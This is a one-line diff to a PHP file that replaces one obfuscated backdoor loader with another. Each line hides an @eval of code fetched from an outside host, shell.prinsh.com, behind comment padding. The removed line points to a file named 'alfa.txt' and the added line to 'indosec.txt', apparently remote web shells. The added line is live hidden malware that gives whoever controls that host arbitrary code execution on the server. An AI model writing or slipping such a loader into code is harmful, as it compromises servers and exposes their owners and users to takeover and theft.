@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://shell.prinsh.com/Nathan/alfa.txt"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://shell.prinsh.com/Nathan/indosec.txt"));/**/?>
